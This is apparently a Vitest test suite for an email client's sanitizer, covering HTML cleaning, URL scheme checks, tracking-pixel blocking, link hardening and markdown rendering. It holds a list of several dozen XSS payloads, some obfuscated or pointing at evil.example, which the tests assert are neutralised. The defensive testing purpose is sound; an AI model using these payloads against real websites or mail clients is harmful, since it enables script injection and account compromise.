import { describe, it, expect } from 'vitest'
import {
  MAIL_BODY_TYPE,
  allowRemoteResources,
  blockRemoteResources,
  hardenLinks,
  isSafeUrl,
  looksLikeMarkdownDocument,
  normalizeNestedBody,
  prepareMailBody,
  prepareMarkdownBody,
  renderMarkdown,
  sanitizeMailHtml,
  unwrapNestedMessage,
} from '../src/utils/mail-html.js'

/** Everything a mail body might use to escape its box. */
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<img src=x OnErRoR="alert(1)">',
  '<svg onload=alert(1)></svg>',
  '<svg><script>alert(1)</script></svg>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
  '<embed src="//evil.example/x.swf">',
  '<form action="//evil.example"><input name="x" autofocus onfocus=alert(1)></form>',
  '<style>body{background:url(javascript:alert(1))}</style>',
  '<link rel="stylesheet" href="//evil.example/x.css">',
  '<base href="//evil.example/">',
  '<meta http-equiv="refresh" content="0;url=//evil.example">',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<template><script>alert(1)</script></template>',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="jav\tascript:alert(1)">click</a>',
  '<a href="jav&#x09;ascript:alert(1)">click</a>',
  '<a href="vbscript:msgbox(1)">click</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="behavior:url(#default#time2)">x</div>',
  '<div style="position:fixed;top:0;left:0;z-index:99999">overlay</div>',
  '<body onload="alert(1)">',
  '<details open ontoggle="alert(1)">x</details>',
  '<video><source onerror="alert(1)"></video>',
  '<canvas onmouseenter="alert(1)"></canvas>',
  '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
  '<p title="</p><img src=x onerror=alert(1)>">x</p>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">x</p></noscript>',
  '<input autofocus onfocus=alert(1)>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<dialog open><script>alert(1)</script></dialog>',
]

/**
 * Inspect a sanitized string as a real DOM fragment.
 *
 * String assertions cannot tell an event handler from the harmless text
 * `onerror=alert(1)` sitting inside a title attribute or a `<code>` block, so
 * every attribute is checked structurally instead.
 */
function inspect(html) {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html')
  const elements = Array.from(doc.body.querySelectorAll('*'))

  return {
    elements,
    tags: elements.map(element => element.tagName.toLowerCase()),
    attributeNames: elements.flatMap(element => Array.from(element.attributes, attr => attr.name.toLowerCase())),
    urlValues: elements.flatMap(element => Array.from(element.attributes)
      .filter(attr => ['href', 'src', 'action', 'formaction', 'data', 'poster', 'background', 'srcset', 'ping'].includes(attr.name.toLowerCase()))
      .map(attr => attr.value)),
  }
}

describe('sanitizeMailHtml', () => {
  it.each(XSS_PAYLOADS)('neutralises %s', (payload) => {
    const html = sanitizeMailHtml(payload)
    const dom = inspect(html)

    for (const tag of ['script', 'iframe', 'object', 'embed', 'form', 'style', 'link', 'base', 'meta', 'svg', 'math', 'template', 'input', 'button', 'dialog', 'video', 'audio', 'canvas']) {
      expect(dom.tags, tag).not.toContain(tag)
    }

    // No event handler attribute survives, whatever its casing or spacing.
    expect(dom.attributeNames.filter(name => name.startsWith('on'))).toEqual([])

    for (const value of dom.urlValues) {
      expect(value, value).not.toMatch(/^\s*(?:javascript|vbscript|data:text\/html)/i)
    }

    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toMatch(/vbscript:/i)
    expect(html).not.toMatch(/data:text\/html/i)
    // Style declarations that can overlay the app or fetch a resource are gone.
    expect(html).not.toMatch(/position\s*:/i)
    expect(html).not.toMatch(/z-index\s*:/i)
    expect(html).not.toMatch(/behavior\s*:/i)
    expect(html).not.toMatch(/url\s*\(/i)
  })

  it('keeps the presentation-safe parts of a real newsletter', () => {
    const html = sanitizeMailHtml(
      '<table width="600" style="border-collapse:collapse"><tr>' +
      '<td style="color:#333;padding:8px"><h1>Hi</h1><p>Body</p></td>' +
      '</tr></table><hr><strong>bold</strong>'
    )

    expect(html).toContain('<table')
    expect(html).toContain('<h1>Hi</h1>')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('border-collapse')
    expect(html).toContain('color: #333')
  })

  it('drops only the dangerous declaration of a mixed style attribute', () => {
    const html = sanitizeMailHtml('<div style="color:red;position:fixed;font-size:14px">x</div>')

    expect(html).toContain('color: red')
    expect(html).toContain('font-size: 14px')
    expect(html).not.toContain('position')
  })

  it('is idempotent, so sanitizing twice is safe', () => {
    const once = sanitizeMailHtml('<p onclick="x()">a</p><script>b</script>')
    expect(sanitizeMailHtml(once)).toBe(once)
  })

  it('handles empty, null and malformed input', () => {
    expect(sanitizeMailHtml('')).toBe('')
    expect(sanitizeMailHtml(null)).toBe('')
    expect(sanitizeMailHtml(undefined)).toBe('')
    expect(sanitizeMailHtml('<div><p>unclosed')).toContain('unclosed')
  })

  // Sanitized twice on purpose (it must be idempotent); see the note on the
  // large-body frame test for why the timeout is explicit.
  it('processes a huge body without throwing', () => {
    const huge = `<div style="color:red">${'<p>line</p>'.repeat(40000)}</div>`
    const html = sanitizeMailHtml(huge)

    expect(html.length).toBeGreaterThan(100000)
    expect(sanitizeMailHtml(huge)).toBe(html)
  }, 30000)
})

describe('isSafeUrl', () => {
  it('allows the schemes a mail may legitimately use', () => {
    for (const url of [
      'https://example.com/a?b=c#d',
      'http://example.com',
      'mailto:someone@example.com',
      'tel:+123456',
      '/relative/path',
      '?query=1',
      '#anchor',
      '//protocol-relative.example/x',
    ]) {
      expect(isSafeUrl(url), url).toBe(true)
    }
  })

  it('allows raster data images but not svg or html data URLs', () => {
    expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=')).toBe(true)
    expect(isSafeUrl('data:image/jpeg;base64,/9j/4AAQ')).toBe(true)
    expect(isSafeUrl('data:image/svg+xml;base64,PHN2Zz4=')).toBe(false)
    expect(isSafeUrl('data:text/html;base64,PHNjcmlwdD4=')).toBe(false)
  })

  it('rejects script-carrying schemes, including obfuscated ones', () => {
    for (const url of [
      'javascript:alert(1)',
      'JavaScript:alert(1)',
      'java\nscript:alert(1)',
      'java\tscript:alert(1)',
      '  javascript:alert(1)',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://example.com/x',
    ]) {
      expect(isSafeUrl(url), url).toBe(false)
    }
  })

  it('treats an empty value as unsafe', () => {
    expect(isSafeUrl('')).toBe(false)
    expect(isSafeUrl(null)).toBe(false)
  })
})

describe('remote content', () => {
  it('parks a tracking pixel instead of letting it fire', () => {
    const { html, blocked } = blockRemoteResources('<p>hi</p><img src="https://track.example/open.gif">')

    expect(blocked).toBe(1)
    expect(html).not.toMatch(/(?:^|\s)src="/)
    expect(html).toContain('data-nova-remote-src="https://track.example/open.gif"')
  })

  it('leaves inline (data:) and relative images alone', () => {
    const source = '<img src="data:image/png;base64,iVBORw0KGgo="><img src="/api/attachments/1">'
    const { html, blocked } = blockRemoteResources(source)

    expect(blocked).toBe(0)
    expect(html).toContain('data:image/png;base64,')
    expect(html).toContain('/api/attachments/1')
  })

  it('blocks remote backgrounds and posters too', () => {
    const { blocked } = blockRemoteResources(
      '<table background="https://t.example/bg.png"><tr><td>c</td></tr></table>' +
      '<video poster="https://t.example/p.gif"></video>'
    )

    expect(blocked).toBe(2)
  })

  it('restores every parked resource once the reader opts in', () => {
    const source = '<img src="https://t.example/a.gif"><table background="https://t.example/b.png"><tr><td>c</td></tr></table>'
    const blockedHtml = blockRemoteResources(source).html

    expect(blockedHtml).not.toMatch(/(?:^|\s)src="/)
    expect(blockedHtml).not.toMatch(/(?:^|\s)background="/)

    const allowed = allowRemoteResources(blockedHtml)

    expect(allowed).toContain('src="https://t.example/a.gif"')
    expect(allowed).toContain('background="https://t.example/b.png"')
    expect(allowed).not.toContain('data-nova-remote')
  })

  it('prepareMailBody blocks by default and allows on request', () => {
    const source = '<img src="https://t.example/x.gif">'

    const blocked = prepareMailBody({ html: source })
    expect(blocked.blocked).toBe(1)
    expect(blocked.html).not.toMatch(/(?:^|\s)src="/)

    const allowed = prepareMailBody({ html: source, allowImages: true })
    expect(allowed.blocked).toBe(0)
    expect(allowed.html).toContain('src="https://t.example/x.gif"')
  })
})

describe('hardenLinks', () => {
  it('opens links externally without handing over window.opener', () => {
    const html = hardenLinks('<a href="https://example.com/x">example</a>')

    expect(html).toContain('target="_blank"')
    expect(html).toContain('noopener')
    expect(html).toContain('noreferrer')
    expect(html).toContain('nofollow')
    // The real destination is always visible, even if the text lies.
    expect(html).toContain('title="https://example.com/x"')
  })

  it('flags a link whose text pretends to be another URL', () => {
    const html = hardenLinks('<a href="https://evil.example/">https://bank.example</a>')
    expect(html).toContain('data-nova-mismatch="1"')
  })

  it('removes an unsafe href entirely', () => {
    const html = hardenLinks('<a href="javascript:alert(1)">x</a>')

    expect(html).not.toContain('javascript:')
    expect(html).not.toContain('href')
  })
})

describe('markdown bodies', () => {
  it('renders markdown without ever passing raw HTML through', () => {
    const html = renderMarkdown('# Title\n\n<script>alert(1)</script>\n\n**bold**')

    expect(html).toContain('<h1>Title</h1>')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).not.toContain('<script')
    expect(html).toContain('&lt;script&gt;')
  })

  it('escapes an html payload that hides inside a code span or link title', () => {
    const html = renderMarkdown('`<img src=x onerror=alert(1)>`\n\n[x](https://e.example "<img src=x onerror=alert(1)>")')
    const dom = inspect(html)

    // The payload is text, not markup: no element and no handler attribute.
    expect(dom.tags).not.toContain('img')
    expect(dom.attributeNames.filter(name => name.startsWith('on'))).toEqual([])
    expect(html).toContain('&lt;img')
  })

  it('drops an unsafe markdown link and keeps a safe one', () => {
    const html = renderMarkdown('[bad](javascript:alert(1)) and [good](https://example.com)')
    const dom = inspect(html)

    for (const value of dom.urlValues) {
      expect(value, value).not.toMatch(/^javascript:/i)
    }

    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('target="_blank"')
    // Only the safe link became an element; the rejected one stays plain text.
    const anchors = dom.elements.filter(element => element.tagName.toLowerCase() === 'a')
    expect(anchors).toHaveLength(1)
    expect(anchors[0].getAttribute('href')).toBe('https://example.com')
  })

  it('blocks a markdown tracking pixel until the reader opts in', () => {
    const source = '![logo](https://track.example/open.gif)'

    const blocked = prepareMarkdownBody(source)
    expect(blocked.blocked).toBe(1)
    expect(blocked.html).toContain('data-nova-remote-src="https://track.example/open.gif"')

    const allowed = prepareMarkdownBody(source, { allowImages: true })
    expect(allowed.blocked).toBe(0)
    expect(allowed.html).toContain('src="https://track.example/open.gif"')
  })

  it('keeps tables and code blocks intact', () => {
    const html = prepareMarkdownBody('| a | b |\n| - | - |\n| 1 | 2 |\n\n```js\nconst x = 1\n```').html

    expect(html).toContain('<table>')
    expect(html).toContain('<code')
  })

  it('exposes the body-type constants the worker stores', () => {
    expect(MAIL_BODY_TYPE.HTML).toBe('text/html')
    expect(MAIL_BODY_TYPE.MARKDOWN).toBe('text/markdown')
    expect(MAIL_BODY_TYPE.PLAIN).toBe('text/plain')
  })
})

describe('nested raw message bodies', () => {
  it('unwraps headers and honours the inner content type', () => {
    const markdown = unwrapNestedMessage(
      'MIME-Version: 1.0\nContent-Type: text/markdown; charset=utf-8\n\n# Hello\n\n**Bold** text.',
    )

    expect(markdown.bodyType).toBe(MAIL_BODY_TYPE.MARKDOWN)
    expect(markdown.text).toBe('# Hello\n\n**Bold** text.')

    const html = unwrapNestedMessage(
      'MIME-Version: 1.0\nContent-Type: text/html; charset=utf-8\n\n<div>Hi</div>',
    )

    expect(html.bodyType).toBe(MAIL_BODY_TYPE.HTML)
    expect(html.content).toBe('<div>Hi</div>')
  })

  it('tolerates a separator line that only holds spaces', () => {
    expect(unwrapNestedMessage('Content-Type: text/markdown; charset=utf-8\n \n# Hello').bodyType)
      .toBe(MAIL_BODY_TYPE.MARKDOWN)
  })

  it('leaves ordinary prose alone', () => {
    expect(unwrapNestedMessage('Note: this is important.\n\nThanks')).toBe(null)
    expect(unwrapNestedMessage('Just a body with no headers.')).toBe(null)
  })

  it('re-points a message at its real body', () => {
    const message = { emailId: 1, bodyType: 'text/plain', text: 'MIME-Version: 1.0\nContent-Type: text/markdown; charset=utf-8\n\n# Hi', content: '' }
    const normalized = normalizeNestedBody(message)

    expect(normalized.bodyType).toBe(MAIL_BODY_TYPE.MARKDOWN)
    expect(normalized.text).toBe('# Hi')
    expect(normalized.emailId).toBe(1)
  })

  it('returns the message untouched when there is nothing to unwrap', () => {
    const message = { emailId: 2, bodyType: 'text/plain', text: 'plain body' }
    expect(normalizeNestedBody(message)).toBe(message)
  })
})

describe('looksLikeMarkdownDocument', () => {
  it('accepts bodies with strong markdown signals', () => {
    expect(looksLikeMarkdownDocument('# Hello\n\n**Bold** text with a [link](https://example.com).')).toBe(true)
    expect(looksLikeMarkdownDocument('```js\nconst x = 1\n```')).toBe(true)
    expect(looksLikeMarkdownDocument('See [the docs](mailto:x@y.z)')).toBe(true)
  })

  it('leaves ordinary plain text alone', () => {
    expect(looksLikeMarkdownDocument('2 * 3 = 6')).toBe(false)
    expect(looksLikeMarkdownDocument('- sent from my phone')).toBe(false)
    expect(looksLikeMarkdownDocument('Issue #123 is fixed')).toBe(false)
    expect(looksLikeMarkdownDocument('')).toBe(false)
  })
})
